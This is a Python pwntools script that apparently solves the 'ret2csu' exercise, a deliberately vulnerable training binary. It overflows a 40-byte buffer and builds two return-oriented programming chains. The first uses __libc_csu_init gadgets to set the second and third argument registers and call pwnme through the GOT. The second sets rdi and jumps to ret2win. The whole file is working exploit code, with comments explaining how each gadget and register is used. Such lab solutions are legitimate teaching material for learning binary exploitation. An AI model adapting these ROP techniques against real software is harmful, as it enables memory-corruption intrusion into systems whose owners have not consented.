#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

elf = context.binary = ELF(args.EXE or 'ret2csu')
rop = ROP(elf)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

gdbscript = '''
break *pwnme+152
break *pwnme+111
continue
'''.format(**locals())

offset = b'A'*40
pop_rbx_rbp_r12_r13_r14_r15 = p64(0x40069a)  # <__libc_csu_init+90>
mov_rdx_r15_mov_rsi_r14_mov_edi_r13d_call = p64(0x400680)  # <__libc_csu_init+64> ends with `call  QWORD PTR [r12+rbx*8]`
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = pop_rdi+1  # pop_rdi is a 1 byte opcode

payload = [
    offset,
    p64(ret),
    pop_rbx_rbp_r12_r13_r14_r15,
    p64(0),  # rbx = 0
    p64(0),  # rbp = whatever
    p64(elf.got['pwnme']),  # r12 = pwnme@got (because the `call` expects a pointer to a function - thus GOT and not PLT)
    p64(0),  # r13 = whatever
    p64(0xCAFEBABECAFEBABE),  # r14 = second parameter (later rsi will be equal to r14)
    p64(0xD00DF00DD00DF00D),  # r15 = third parameter (later rdx will be equal to r15)
    mov_rdx_r15_mov_rsi_r14_mov_edi_r13d_call
]
payload = b''.join(payload)

call_ret2win = [
    offset,
    p64(pop_rdi),
    p64(0xDEADBEEFDEADBEEF),  # rdi = first parameter
    p64(elf.plt['ret2win'])
]
call_ret2win = b''.join(call_ret2win)

io = start()
io.sendlineafter(b'> ', payload)
io.sendlineafter(b'> ', call_ret2win)

io.interactive()

